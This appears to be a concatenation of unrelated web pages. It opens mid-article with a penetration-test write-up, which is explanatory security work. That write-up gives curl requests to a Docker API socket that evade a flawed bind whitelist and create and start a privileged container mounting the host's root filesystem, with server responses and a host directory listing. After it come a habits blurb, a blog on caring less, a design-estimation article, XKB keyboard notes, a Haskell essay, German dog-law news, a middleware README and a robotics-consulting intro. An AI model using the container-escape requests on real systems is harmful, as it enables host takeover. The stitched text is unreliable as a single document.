<p>The command above is the same (a bit extended) as specified in the section “<strong><em>Create the container with the mounted volume</em>” </strong>of this online <a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/" target="_blank" rel="noreferrer noopener">tutorial</a>, which the penetration tester had linked into his report. I strongly suggest you to read that post before going ahead with this one, if you are not familiar with the technique in general. Anyway, even if you are not familiar, below follows a short explanation of what we were trying to do with that command.</p>



<p>Basically, from inside the container we are in, we are trying to <strong>create</strong> another container that, once started, will have the root directory “<strong><code>/</code></strong>”of the host operating system mounted under its “<strong><code>/hostos/</code></strong>” folder. If that can be done, it is game over. Just connecting to the new container and launching the command “<code>chroot /hostos</code>” would provide the attacker with full access to the host operating system and all its files.</p>



<p>In our case instead the reverse proxy replied with:</p>



<p><code>HTTP/1.1 403 Forbidden</code></p>



<p>Honestly it was expected. Something else had to be attempted.</p>



<h3><strong>Time for circumvention</strong></h3>



<p>After a bit of trial and error we understand that the stricter check is performed on the value passed to “<code>Binds</code>”. When we provide the string “<code>/:/hostos</code>” trying to map the filesystem “<code>/</code>” of the host into the “<code>/hostos</code>” directory of the container, the request is rejected because the specified string is not in the whitelist. However we discovered, for example, that “<code>/dev/log:/dev/log</code>” is an accepted value instead. It means the reverse proxy allows us to create a container from inside another container when that value is provided. Of course there is nothing special with using “<code>/dev/log</code>” to bypass the filter. But what if the strings “<code>/:/hostos</code>” and “<code>/dev/log:/dev/log</code>” are both specified as part of the same “<code>Binds</code>” parameter, like below?</p>



<p><code>bash-4.4$ curl –i –s <em>–-unix-socket /<u>var/run/somethingelse.sock</u></em> –X POST –H ‘Content-Type: application/json’ –data-binary ‘{<strong>"</strong>Hostname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>Domainname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>User<strong>"</strong>: <strong>""</strong>,<strong>"</strong>AttachStdin<strong>"</strong>: true,<strong>"</strong>AttachStdout<strong>"</strong>: true,<strong>"</strong>AttachStderr<strong>"</strong>: true,<strong>"</strong>Tty<strong>"</strong>: true,<strong>"</strong>OpenStdin<strong>"</strong>: true,<strong>"</strong>StdinOnce<strong>"</strong>: true,<strong>"</strong>Entrypoint<strong>"</strong>: <strong>"</strong>/bin/bash<strong>"</strong>,<strong>"</strong>Image<strong>"</strong>: <strong>"</strong>dockerint.company.com/xxx/imagename:1.0.0-SNAPSHOT<strong>"</strong>,<strong>"</strong>Volumes<strong>"</strong>: {<strong>"</strong>/hostos/<strong>"</strong>: {}}, <strong>"</strong>HostConfig<strong>"</strong>: {<strong>"Binds": ["/:/hostos", "/dev/log:/dev/log"]</strong>, <strong>"</strong>Privileged<strong>"</strong>: true}}’ http://localhost/containers/create</code></p>



<p>Unexpectedly, the reverse proxy replies with:</p>



<p><code>HTTP/1.1 201 Created<br>Api-Version: 1.39<br>Content-Length: 90<br>Content-Type: application/json<br>Date: Fri, 15 May 2020 08:19:58 GMT<br>Docker-Experimental: false<br>Ostype: linux<br>Server: Docker/18.09.11 (linux)<p>{"Id":"4fa6bfc84930[...]","Warnings":null}</p></code></p>



<p>So it means we are allowed to create a new container where the root of the host filesystem is mounted into its “<code>/hostos</code>” directory. To confirm that, we manually started the newly created container from the host OS and then accessed it. This was what we got…</p>



<p><code>[root@4fa6bfc84930 opt]# <strong>ls -al /hostos/</strong><br>[...]<br>drwxr-xr-x. 102 root root 8192 May  6 09:08 etc<br>drwxr-xr-x.   6 root root   56 Feb  7  2018 home<br>drwxr-xr-x.   2 root root    6 Mar 10  2016 media<br>drwxr-xr-x.   2 root root    6 Mar 10  2016 mnt<br>drwxr-xr-x.  17 root root 4096 Mar 24  2017 nfs<br>drwxr-xr-x.   7 root root  106 Jan  7  2019 opt<br>dr-xr-xr-x. 375 root root    0 Nov 23 08:23 proc<br>dr-xr-x---.   8 root root 4096 May 14 13:51 root<br>drwxr-xr-x.  35 root root 1140 May  6 09:08 run<br>lrwxrwxrwx.   1 root root    8 Jan 18  2018 sbin -&gt; usr/sbin<br>[...]</code></p>



<p>…meaning that from inside the container we have total control over the entire host OS filesystem, which is what the reverse proxy implementation was attempting to prevent. Good, but how was that possible? Well, let’s have a look once more at the interested part that made the trick possible:</p>



<p><strong><code>"Binds": ["/:/hostos", "/dev/log:/dev/log"]</code></strong></p>



<p>It seems that in case just one of the strings given to the “<code>Binds</code>” parameter is present in the whitelist, the whole check is considered passed, regardless of the presence of other values that are instead not defined in the whitelist configuration. The logic of the reverse proxy was clearly flawed.</p>



<h3><strong>Start the container just created</strong></h3>



<p>So from inside the current container we have managed to create a new one with full access to the host OS filesystem. But we have not executed anything in the host OS yet…and we are still confined within our unprivileged container.</p>



<p><code>bash-4.4$</code></p>



<p>Let’s try to get out of here. First of all let’s see if after its creation we can also start the container from the place where we are now:</p>



<p><code>curl -i -s --unix-socket /var/run/somethingelse.sock -X POST -H 'Content-Type: application/json' http://localhost/containers/<strong>4fa6bfc84930</strong>[...]/start</code></p>



<p>As indicated in the <a href="https://docs.docker.com/engine/api/v1.39/#operation/ContainerStart" target="_blank" rel="noreferrer noopener">Docker API</a> the endpoint to target this time is “<code>/containers/{ID}/start</code>”, where ID (in bold above) is the value the reverse proxy has returned to us with the previous request. The reply we get is:</p>



<p><code>HTTP/1.1 204 No Content<br>Api-Version: 1.39<br>Date: Fri, 15 May 2020 08:20:34 GMT<br>Docker-Experimental: false<br>Ostype: linux<br>Server: Docker/18.09.11 (linux)</code></p>



<p>It means we are allowed to do that. So far, so good. Now the high privileged container is started and we want to execute a command in …</p></div></div>

<p>How to create good habits and break bad ones.</p>

<p>This episode is part of the Habits series. In this excerpt from my interview with Scott Mitchell (episode 29), Scott and I discuss what atomic habits are, how to use them to create good habits and break bad ones, how I started implementing them in my daily routine more than a year ago, the difference between flow and deliberate practice, and why you should schedule your leisure time.</p>

<p>I'm 21 as of 3 weeks ago.</p>
<p>I've been thinking a lot about how I've spent a huge chunk of my life (especially during my late teens) worrying about what others thought of me.</p>
<p>Also about the many problems this has caused in my life.</p>
<p>I'm sure others can relate, it seems to be a common phenomenon at this age. So common, that there is a pretty popular <a href="http://blog.jonathancai.com/fuck/(https://www.amazon.com/Subtle-Art-Not-Giving-Counterintuitive/dp/0062457713)">book</a> about this exact thing, although it is still on my to-read list.</p>
<p>Anyways, here are a few ways that I've personally learned to care less - a list of ways you can become a bit more indifferent to the everyday "BS". Mileage may vary of course.</p>
<h2 id="1-you-re-not-special">1. You're not special</h2>
<p>It sounds bad, but deflating your ego is actually quite liberating.</p>
<p>To think that others are always critiquing you is to assume that you are important enough to be critiqued.</p>
<p>So a good way to stop worrying about others is to realize that people largely don't worry about you either!</p>
<p>You ain't got haters! You ain't <a href="https://genius.com/63318">Waka Flocka</a>, baby!</p>
<p>This has really helped me begin blogging, because I was worried that people would judge me for what I wrote. But I realized that this is a delusion! I don't have a following, no one really cares about my thoughts, so what's stopping me from just putting them out there?</p>
<p>Of course this technique fails if you really are special. Although then you probably wouldn't be reading my blog in that case. I'd be pretty surprised if Flocka Flame was reading this. But to combat this, it might help to zoom out your field of vision. You might be truly special in our society, but across centuries, most will be forgotten, and at best become another line in a history book. Even if people care right now, they probably won't x years from now.</p>
<p>Ryan Holiday's got a great piece on <a href="https://www.amazon.com/Ego-Enemy-Ryan-Holiday/dp/1591847818/ref=sr_1_1?ie=UTF8&amp;qid=1463889922&amp;sr=8-1&amp;keywords=ego+is+the+enemy">ego</a> which feels relevant.</p>
<h2 id="2-care-more-about-other-things">2. Care more about other things</h2>
<p>So this entire post is actually somewhat misleading.</p>
<p>If we give this a second thought, to not worry about anything seems bad also. Being hyper aware of our peers and their opinions of us is certainly bad, but extreme apathy also has its clear problems. So the real goal should be to worry about the <i>right</i> things. As for my misleading blog post title, it's just that "how to not give a fuck" sounds a bit sexier than "how to give a fuck about the right things".</p>
<p>The point is, it's impossible to worry about everything. You don't have the mental capacity to agonize over every decision or thought that crosses your mind.</p>
<p>If you're busy trying to get back to your home on Mars, you don't have time to worry about even <a href="https://www.businessinsider.com/elon-musk-los-angeles-homes-real-estate-portfolio-photos">owning a house</a> here on Earth.</p>
<p>If you run a company that serves billions of users, you don't have time to worry about something as petty as <a href="https://www.businessinsider.com/mark-zuckerberg-same-t-shirt-2014-11">picking out your outfit</a>.</p>
<p>After working at Facebook this summer, I vaguely remembering the term "ruthless prioritization" being thrown around a few times. Maybe it can be attributed mostly to <a href="https://www.inc.com/justin-bariso/sheryl-sandberg-just-gave-some-brilliant-career-ad.html">Sheryl's philosophy</a>, but it seems like a far more polished and office-appropriate way of talking about "how to give a fuck about the <i>right</i> things". So in this frame, "the root of all evil" a.k.a. premature optimization, is just worrying about the wrong things.</p>
<p>There is this cheesy <a href="https://www.youtube.com/watch?v=SqGRnlXplx0">analogy</a> about how your life is like a jar. You fill up with different sized rocks. If you fill it up with sand first, you won't have space for the larger pebbles. But if you fill it up with the larger pebbles first, you can always fill in the gaps with the sand. Rocks first, pebbles next, sand last.</p>
<h2 id="3-you-re-going-to-die">3. You're going to die</h2>
<p>The title of this blog is "memento mori", a Latin phrase that roughly translates to "remember death". My corny ass also got it engraved in my Airpods, but thats besides the point.</p>
<p>Remembering your mortality keeps you from sweating the small stuff.</p>
<p>Who cares if Suzy is spreading rumors about you if you might not make it to next week?</p>
<p>Steve Jobs spoke about death during <a href="https://www.youtube.com/watch?v=xoUfvIb-9U4">his 2005 Stanford commencement address</a>:</p>
<blockquote>
<p>When I was 17, I read a quote that went something like: "If you live each day as if it was your last, someday you'll most certainly be right." It made an impression on me, and since then, for the past 33 years, I have looked in the mirror every morning and asked myself: "If today were the last day of my life, would I want to do what I am about to do today?" And whenever the answer has been "No" for too many days in a row, I know I need to change something.</p>
</blockquote>
<p>I'm no SJ fanboy, but I found this pretty inspirational. I even taped a paper to my wall that said "You're going to die" for the majority of my last college semester (I swear I'm not suicidal, not all the time at least). It probably didn't do much, but I hope that it made me do things that I otherwise wouldn't have.</p>
<p>Paul Graham has his own twist to this, "<a href="http://www.paulgraham.com/vb.html">Life is short</a>". Sounds a bit more polished and elegant I guess.</p>
<p><i>After writing this, I'm thinking that it might not be best for me to use the f word so much. Especially for future employers or business partners... Eh, who gives a fuck...</i></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="7e30365" data-element_type="widget" data-widget_type="raven-post-content.default"><div><p>A few years ago, when I was working for a software development company I wrote an article with some advice on how to estimate software projects. At the time, it was a burning issue in our development team.</p><p>We were getting project inquiries from potential clients and our developers were way off with their time + cost estimates. Can’t blame them, to be honest. Giving the accurate time to complete an entire project, even if the client provides the most detailed specification (which never happens) is extremely difficult.</p><p>Years later, when I moved on to work in design, I eventually bumped into the same situation – getting project inquiries and having to create design estimateions that clients can use to make a decision or budget appropriately. I approached the task thinking it would be a piece of cake compared to software.</p><p>This may be partially true, but it’s definitely not the whole picture.</p><h2><span id="Adjusting_your_internal_process">Adjusting your internal process</span></h2><p>Let’s consider why design estimations are difficult to do. For the most part, it’s because of missing information. On the client’s side, they don’t know how long it takes to create designs and even if they do, they don’t know how much your design team can achieve within a given timeframe.</p><p>On your side (the agency), usually you don’t know the full picture of what your client wants to do and you have no way of knowing what additional features will turn up after you start designing and get a better sense of the scope.</p><p>So, the lack of information is a constant. You’ll always be faced with limited knowledge – no way around that. What you can do instead is to adjust your internal process so this lack of information is not such a huge issue.</p><p>As an example, at Melewi, we work in <a href="https://melewi.net/blog/2016/07/15/whats-design-sprint-work-well/">2-week design sprints</a>. In each sprint, we focus on a specific user flow (e.g. user onboarding, purchase flow, account creation, etc.). When a potential client comes to us, we have a detailed call to understand what they want to build, who they’re building it for, and how the users will be interacting with the product.</p><p>This helps us map the rough amount of user flows and their complexity. From there, we can determine the number of sprints we’ll need to design the product.</p><p>Through the years of creating design estimations and working with clients, we’ve also seen that often times plans change and once a product starts taking shape, clients also start to have a better idea of what they need. This is why we’ve found it easier to keep things flexible and charge clients per sprint, not for an X-month long project.</p><p>That way, we can start with a design scope that takes 4 sprints and add more design sprints as we move along if there are a lot of new features that need to be designed.</p><h2><span id="Leave_yourself_some_wiggle_room">Leave yourself some wiggle room</span></h2><p>Bearing in mind how uncertain design estimations can be, you should always leave some room for revision at a later stage, when you expect to have more information. Be sure to prepare your client that the estimate you’re giving them now might be subject to change, based on what you discover in the future.</p><p>We do this in two steps. First, after we have an initial call with an interested client, we come up with a rough estimate so they can get a feeling of how much time the project will take and what it might cost. Our design process always involves a series of kickoff workshops, before we actually start designing.</p><p> Those workshops are intended to provide us with a ton of additional background information, about the client’s business idea, value proposition, competitive landscape, and user persona. This knowledge will both help our designers when creating the UX &amp; UI, and it will also help us get a better understanding of the scope and any industry-specific features that might take longer to design.</p><p>Naturally, after we’re done with the design workshops we have a much better understanding of the work we need to do. This is the point where we might re-evaluate the estimate we initially provided, if the scope is much larger.</p><h2><span id="What_about_ad-hoc_design">What about ad-hoc design?</span></h2><p>So far, my main point was that your internal process can mitigate some of the issues that come with design estimations. However, that internal process is not universal. If you’re doing <a href="https://melewi.net/ux-design.html">full UX &amp; UI design projects</a> from start to finish and occasional ad-hoc design work, the same process won’t work for both cases. If a client comes to you and needs design for a 10-page brochure for an upcoming conference, they’ll need to know some numbers.</p><p>The good news is you’ll get better at estimating those types of requests with every next project you do. You’ll get a feeling of how much time it takes to come up with the structure, fill it with design elements, add colors, shapes, etc. You’ll also start automatically provisioning some time for back-and-forth communication (which shouldn’t be underestimated).</p><p>Still, if this is not a usual project inquiry for you, consider the lack of knowledge you have now and what information you’ll need to be able to come up with a design estimation.</p><p>First, you’ll need the see the content of the brochure (or whatever you need to design). This will help you understand how much text/images there should be in it and what’s the available space you’ll be working with.</p><p>Second, you’ll need to get some context. What kind of conference is this intended for? Who will be reading this brochure? This will give you some directions on the actual design you need to create – does it have to be something wild and eye-catching, or something more clean and subtle.</p><p>Third, ask them about the deadline. When do they ideally want to have it ready? The estimate doesn’t necessarily have to be X number of hours times your rate per hour. If the client wants to have it ASAP, that’s additional after-work hours and additional stress for you. This has to be compensated accordingly.</p><h2><span id="Conclusion">Conclusion</span></h2><p>Design estimations are hard to do accurately. Whether you need to estimate a UX &amp; UI design project or an ad-hoc design task, 9 times out of 10 you’ll be faced with a lot of uncertainty. Instead of trying to nail the time and cost down to every small detail, create an environment where changing the scope won’t matter that much.</p><p>Keep things flexible and communicate clearly that estimating design projects requires context and background information. Don’t be afraid to ask your clients to do some homework.</p><hr><p>Further reading on estimating UX projects – <a href="https://uxmastery.com/how-to-estimate-a-ux-project/" target="_blank" rel="noopener">https://uxmastery.com/how-to-estimate-a-ux-project</a></p></div></div></div>]]>

<h2 id="insert-mode">Insert Mode<a href="#insert-mode" arialabel="Anchor">⌗</a> </h2>
<p><img src="https://cedaei.com/images/insert_mode.jpg" alt="Insert Mode: A keyboard layout similar to normal QWERTYlayout"></p>
<h2 id="normal-mode">Normal Mode<a href="#normal-mode" arialabel="Anchor">⌗</a> </h2>
<p><img src="https://cedaei.com/images/normal_mode.jpg" alt="Normal Mode: A keyboard layout with the alphabet keys replaced with shortcutkey"></p>
<p>Inspired by vim, I wanted to create a layer on top of my keyboard which worked
like a shortcut layer. So, to start off, I found out about XKB<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. XKB is the
Xorg Keyboard Extension which tells Xorg on how to react to input from
keyboard.  After reading through some source code, I found out that Xorg has
support for function keys F1 - F35<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. The general idea here was:</p>
<ul>
<li>Create an insert mode layout for text input.</li>
<li>Replace keys with relevant keys in normal mode (e.g. replace j with Down) and
for keys that require executing a command, replace then with a function key
above F12 (e.g. replace q with F13).</li>
<li>Bind all the function keys above F12 to the respective functions.</li>
</ul>
<p>To start off, I began a fresh Xorg session with nothing modifying the keys
(removed <code>xmodmap</code> from startup) and first dumped the current layout into a
file.</p>
<div><pre><code data-lang="bash">xkbcomp $DISPLAY ~/.xkb/insert.xkb
</code></pre></div><p>This was my starting point. I made changes to this file which were common to
both Insert and Normal mode. e.g. replaced <code>Caps Lock</code> with <code>Ctrl</code> and made
<code>Shift+Caps Lock</code> <code>Caps Lock</code>. Also, I unbound <code>Alt_R</code> as a modifier so that I
could use that as a switch between Normal and Insert Mode.</p>
<p>Here is a diff between the original layout and Insert mode.</p>
<pre><code>1323c1321
&lt;     key &lt;CAPS&gt; {         [       Caps_Lock ] };
---
&gt;     key &lt;CAPS&gt; {         [       Control_L,       Caps_Lock ] };
1551c1549
&lt;     modifier_map Lock { &lt;CAPS&gt; };
---
&gt;     modifier_map Control { &lt;CAPS&gt; };
1555d1552
&lt;     modifier_map Mod1 { &lt;RALT&gt; };
</code></pre><p>Next, I copied <code>~/.xkb/insert.xkb</code> to <code>~/.xkb/normal.xkb</code>. I replaced keys as
per the plan.</p>
<p>Here is a diff between Insert mode and Normal mode.</p>

        <p>Much advocacy of Haskell, in general, boils down to type-safety and elimination of bugs. How boring. My personal experience is that bugs are trickier in Haskell and I can write bad code in an extraordinary variety of ways.</p>
<p>I don’t code in Haskell to help eliminate bugs. That seems a goal unlikely to produce joy in my code. I write Haskell primarily because in enables me to name things a bit better.</p>
<h2 id="what-is-learning">What is Learning?</h2>
<p>As an example, I came across this quote within the first few pages of a popular online course on machine learning:</p>
<blockquote>
<p>A computer program is said to learn from experience E with respect to some task T and some performance measure P, if its performance on T, as measured by P, improves with experience E. ~ Tom Mitchell</p>
</blockquote>
<p>Here’s how I unpacked this into types:</p>
<div><pre><code data-lang="haskell"><span>-- | learning is to use experience to change the performance of a task.</span>
<span>newtype</span> <span>Learn</span> f e p <span>=</span>
  <span>Learn</span> { change <span>::</span> (<span>Foldable</span> f) <span>=&gt;</span> <span>Experience</span> f e <span>-&gt;</span> <span>Task</span> e p <span>-&gt;</span> <span>Task</span> e p }

</code></pre></div><p>A common approach to newtypes is to label the unwrapping as a reversal of the newtype (such as <code>unlearn</code> or <code>unLearn</code>) but this misses an important naming opportunity: to use a Learn is to change.</p>
<div><pre><code data-lang="haskell"><span>-- | An experience is set of e's</span>
<span>newtype</span> <span>Experience</span> f e <span>=</span> <span>Experience</span> { set <span>::</span> f e }

</code></pre></div><p>This could be thought of (and coded) as an ordinary function with type (e -&gt; p). The advantage of using a newtype, however, is to highlight the two ways that a task can change:</p>
<ul>
<li>changing the way a task is performed (the <code>e</code>).</li>
<li>changing the way a task is measured (the <code>p</code>).</li>
</ul>
<p>Acting on a learning, you can change the way a task is performed, such as changing parameters of a function, or change the way you view what performance is.</p>
<p>To change the way a task is performed, taking experience into account, is to make progress. Progress is made one step at a time.</p>
<div><pre><code data-lang="haskell"><span>-- | To progress, is to transduce a Task, via a carrier</span>
<span>newtype</span> <span>Progress</span> e p <span>=</span> <span>Progress</span> { step <span>::</span> e <span>-&gt;</span> <span>Task</span> e p <span>-&gt;</span> <span>Task</span> e p}
</code></pre></div><p>Putting these above types together in a useful way, to learn, is then to repeatedly apply a progressive step to a set of experiences.</p>
<div><pre><code data-lang="haskell"><span>-- | to learn, is to make Progress from an Experience.</span>
<span>learn</span> <span>::</span> <span>Progress</span> e p <span>-&gt;</span> <span>Learn</span> f e p
<span>learn</span> p <span>=</span> <span>Learn</span> $ <span>\</span>(<span>Experience</span> e) task <span>-&gt;</span> foldr (step p) task e
</code></pre></div><p>To <code>machine learn</code>, we change the way a <code>machine</code> does a task, based on learning, measuring whether performance improves, and adopt the new way to do a task if it does.</p>
<div><pre><code data-lang="haskell"><span>-- | to improve, given a way to change a task by experience, </span>
<span>--</span>
<span>-- you need to choose the better performace way over an experience set.</span>
<span>improve</span> <span>::</span>
  (<span>Ord</span> (f p), <span>Foldable</span> f, <span>Functor</span> f) <span>=&gt;</span>
  <span>Progress</span> e p <span>-&gt;</span>
  <span>Experience</span> f e <span>-&gt;</span>
  <span>Task</span> e p <span>-&gt;</span>
  <span>Task</span> e p
<span>improve</span> progress es task <span>=</span>
  bool task task' (p' &gt; p)
  <span>where</span>
    task' <span>=</span> change (learn progress) es task
    p <span>=</span> measure task &lt;$&gt; set es
    p' <span>=</span> measure task' &lt;$&gt; set es
</code></pre></div><p>The constraints contained in the above code are mostly based on suggestions from ghc to get a compile, and I didn’t think about them much in drafting. Type constraints provide useful guide-rails for future development of these ideas.</p>
<h2 id="machine-learning-in-haskell">Machine Learning in Haskell?</h2>
<p>In the above example of improving we are left with an <code>Ord (f p)</code> constraint - that the performance over an experience set is ordinal. If we narrow the constraint to a <code>Num (f p)</code>, in other words, assume that the size of the <code>f p</code> is meaningful, then we have wandered in to the traditional numerical methods domain, and can, for example, start to think about gradients to speed up our improvement.</p>
<p>By insisting on useful and concrete names (aka types), Haskell supplies a constrained domain we can further explore.  For example, are there machine learning examples that don’t fit the candidate types and constraints?</p>
<p>Naming things is hard, and other ways of coding tend to avoid the task. Types bring me joy and I shall keep them, thank you very much, and continue to curate collections of them, for fun and profit. In this example, I now have as good a definition of machine learning as you’ll find out in the wild, and my progress on machine learning will be more comprehensive, faster and safer than bashing away in python.</p>
<p>And yet, to a first degree, machine learning in Haskell does not exist, swamped by the easiness of dynamic types. If the promises being made by ML are to be eventually honoured, however, it may need less code bashing and better naming.</p>

        <!--?xml version="1.0" encoding="UTF-8"?--><p>In future, a dog’s right to exercise could be enshrined in German law. That’s if a new draft ordinance issued by the Federal Ministry of Agriculture is passed. The law also seeks to improve conditions during the transportation of farm animals.</p><h2>New rules for dog owners, breeders and farm animals in Germany</h2><p>According to the draft regulation, which was seen by the German newspaper Rheinische Post, in future dog owners will have to ensure that their animals are walked at least twice a day, for a total of one hour. They will no longer be permitted to leave their dogs home alone all day or keep them chained up outside; a carer will need to check in on the animal “several times a day”.</p><p>Further rules will also apply specifically to dog breeders. The draft law stipulates that breeders be allowed to look after no more than three bitches with puppies at the same time. There will also be new regulations regarding the size and temperature of whelping boxes.&nbsp;</p><p>Shows with dogs that have been overbred to such an extent that they are in pain or no longer able to “behave appropriately” will be banned, as will those featuring animals whose body parts (such as ears or tail) have been “completely or partially amputated” in a manner contrary to animal welfare.&nbsp;</p><p>For farm animals, the new law stipulates that livestock transports within Germany may not exceed four and a half hours if the animals are directly exposed to temperatures of more than 30 degrees.</p><h2>Animals need movement and environmental stimuli</h2><p>The draft law cites “new scientific knowledge about the needs of dogs” as a justification for the stricter rules. Accordingly, animals should be given “a sufficient degree of movement and contact with environmental stimuli.” Federal Agriculture Minister Julia Klöckner said, “<a href="https://www.iamexpat.de/lifestyle/pets-information-germany">Pets</a> are not cuddly toys.”</p><p>When asked how the new laws will be enforced, especially for private dog owners, a spokesperson for the Agriculture Ministry said that the federal states would be responsible - but that they certainly wouldn’t be ringing the doorbell of every dog owner to check up on them. The law is primarily targeting those who keep their dogs outside in kennels. The draft now needs to be coordinated with the 16 federal states and professional associations.&nbsp;</p>

</ul>

<h2 id="other-packages">Other packages</h2>

<p>Furthermore there is utility collection available at <a href="https://dbartholomae.github.io/packages/utils">@lambda-middleware/utils</a>.</p>

<h2 id="usage">Usage</h2>

<p>Each middleware is a higher-order function that can be wrapped around the handler function.</p>

<div><div><pre><code><span>export</span> <span>const</span> <span>handler</span> <span>=</span> <span>someMiddleware</span><span>()(()</span> <span>=&gt;</span> <span>{</span>
  <span>return</span> <span>{</span>
    <span>body</span><span>:</span> <span>''</span><span>,</span>
    <span>statusCode</span><span>:</span> <span>200</span>
  <span>}</span>
<span>})</span>
</code></pre></div></div>

<p>Each middleware is build as</p>
<div><div><pre><code><span>(</span><span>options</span><span>)</span> <span>=&gt;</span> <span>(</span><span>handler</span><span>)</span> <span>=&gt;</span> <span>(</span><span>event</span><span>,</span> <span>context</span><span>)</span> <span>=&gt;</span> <span>Response</span>
</code></pre></div></div>

<p>This means that middleware can be composed and piped like any other function with only one parameter (the handler).
This library contains <a href="https://dbartholomae.github.io/lambda-middleware/packages/compose">a helper for composing</a>, but <a href="https://lodash.com/docs/4.17.15#flowRight">any</a>
<a href="https://ramdajs.com/docs/#compose">other</a> <a href="https://github.com/tc39/proposal-pipeline-operator">implementation</a> should
work as well.</p>

<div><div><pre><code><span>export</span> <span>const</span> <span>handler</span> <span>=</span> <span>compose</span><span>(</span>
  <span>someMiddleware</span><span>(),</span>
  <span>someOtherMiddleware</span><span>(),</span>
  <span>aThirdMiddleware</span><span>()</span>
<span>)(()</span> <span>=&gt;</span> <span>{</span>
  <span>return</span> <span>{</span>
    <span>body</span><span>:</span> <span>''</span><span>,</span>
    <span>statusCode</span><span>:</span> <span>200</span>
  <span>}</span>
<span>})</span>
</code></pre></div></div>

<p>Composing middleware is equivalent to calling it nested:</p>
<div><div><pre><code><span>export</span> <span>const</span> <span>handler</span> <span>=</span>
  <span>someMiddleware</span><span>()(</span>
    <span>someOtherMiddleware</span><span>()(</span>
      <span>aThirdMiddleware</span><span>()(()</span> <span>=&gt;</span> <span>{</span>
        <span>return</span> <span>{</span>
          <span>body</span><span>:</span> <span>''</span><span>,</span>
          <span>statusCode</span><span>:</span> <span>200</span>
        <span>}</span>
      <span>})</span>
    <span>)</span>
  <span>)</span>
</code></pre></div></div>

<p>The order of composition can be relevant. When using a helper to do the composition, check, in which order the functions
are applied. Most of the time TypeScript should be able to warn you, if the order is wrong.</p>

<p>Imagine middleware as an onion around your function: The outermost middleware will get called first before the handler
starts, and last after the handler finishes or throws an error. In our example above the order in which middleware gets
executed therefore would be:</p>
<div><div><pre><code>someMiddleware
  someOtherMiddleware
    aThirdMiddleware
      the handler
    aThirdMiddleware
  someOtherMiddleware
someMiddleware
</code></pre></div></div>
<p>This means that middleware which transforms the input for the handler will be executed top to bottom, while middleware
that transforms the response will be called bottom to top.</p>

<h2 id="writing-your-own-middleware">Writing your own middleware</h2>

<p>If you want to write your own middleware, check the existing examples and feel free to borrow some of the tests for
inspiration. The general idea for a middleware is the following:</p>
<div><div><pre><code><span>const</span> <span>myMiddleware</span> <span>=</span> <span>(</span><span>optionsForMyMiddleware</span><span>)</span> <span>=&gt;</span> <span>(</span><span>handler</span><span>)</span> <span>=&gt;</span> <span>async</span> <span>(</span><span>event</span><span>,</span> <span>context</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>try</span> <span>{</span>
    <span>const</span> <span>modifiedEvent</span> <span>=</span> <span>doSomethingBeforeCallingTheHandler</span><span>(</span><span>event</span><span>)</span>
    <span>const</span> <span>response</span> <span>=</span> <span>await</span> <span>handler</span><span>(</span><span>modifiedEvent</span><span>,</span> <span>context</span><span>)</span>
    <span>const</span> <span>modifiedResponse</span> <span>=</span> <span>doSomethingAfterCallingTheHandler</span><span>(</span><span>response</span><span>)</span>
    <span>return</span> <span>modifiedResponse</span>
  <span>}</span> <span>catch</span> <span>(</span><span>error</span><span>)</span> <span>{</span>
    <span>const</span> <span>modifiedError</span> <span>=</span> <span>doSomethingInCaseOfAnError</span><span>(</span><span>error</span><span>)</span>
    <span>throw</span> <span>modifiedError</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>
<p>Usually the same middleware should not need to do something before the handler, after the handler and on error.
Creating separated middlewares for these cases keeps them more versatile. But cases that require multiple steps are
supported as well.</p>

<p>Since the middlewares only uses function composition, TypeScript can offer extensive typing support to let you know
how the middleware changed. When adding your own middleware it is recommended to use generics to avoid losing type
information.</p>

<p>Instead of</p>
<div><div><pre><code><span>const</span> <span>bodyParser</span> <span>=</span> <span>()</span> <span>=&gt;</span>
  <span>(</span><span>handler</span><span>:</span> <span>PromiseHandler</span><span>&lt;</span><span>Omit</span><span>&lt;</span><span>APIGatewayProxyEvent</span><span>,</span> <span>body</span><span>&gt;</span> <span>&amp;</span> <span>{</span> <span>body</span><span>:</span> <span>object</span><span>},</span> <span>APIGatewayProxyResult</span><span>&gt;</span><span>):</span> <span>PromiseHandler</span><span>&lt;</span><span>APIGatewayProxyEvent</span><span>,</span> <span>APIGatewayProxyResult</span><span>&gt;</span> <span>=&gt;</span>
  <span>async</span> <span>(</span><span>event</span><span>:</span> <span>E</span><span>,</span> <span>context</span><span>:</span> <span>Context</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>return</span> <span>handler</span><span>({</span> <span>...</span><span>event</span><span>,</span> <span>body</span><span>:</span> <span>JSON</span><span>.</span><span>parse</span><span>(</span><span>event</span><span>.</span><span>body</span><span>)</span> <span>},</span> <span>context</span><span>)</span>
<span>}</span>
</code></pre></div></div>
<p>use</p>
<div><div><pre><code><span>const</span> <span>bodyParser</span> <span>=</span> <span>()</span> <span>=&gt;</span>
  <span>&lt;</span><span>E</span> <span>extends</span> <span>APIGatewayProxyEvent</span><span>&gt;</span><span>(</span><span>handler</span><span>:</span> <span>PromiseHandler</span><span>&lt;</span><span>Omit</span><span>&lt;</span><span>E</span><span>,</span> <span>body</span><span>&gt;</span> <span>&amp;</span> <span>{</span> <span>body</span><span>:</span> <span>object</span><span>},</span> <span>APIGatewayProxyResult</span><span>&gt;</span><span>):</span> <span>PromiseHandler</span><span>&lt;</span><span>E</span><span>,</span> <span>APIGatewayProxyResult</span><span>&gt;</span> <span>=&gt;</span>
  <span>async</span> <span>(</span><span>event</span><span>:</span> <span>E</span><span>,</span> <span>context</span><span>:</span> <span>Context</span><span>)</span> <span>=&gt;</span> <span>{</span>

<span>}</span>
</code></pre></div></div>
<p>so that if multiple middlewares change the event, the resulting type will have all changes and not just the latest.</p>

            </p>
        
      
      <p>It’s that time of year again when I’m thinking back on the journey I set up for myself by deciding to go into Robotics Consulting. This article is a follow up to the blog post I wrote <a href="https://msadowski.github.io/one-year-of-robotics-consulting/">last year</a>. This year, I’ve decided to try and cover the most important aspects of what I’m doing, and how it has been working out for me.</p>

<!-- more -->

<h2 id="the-work-i-had">The work I had</h2>

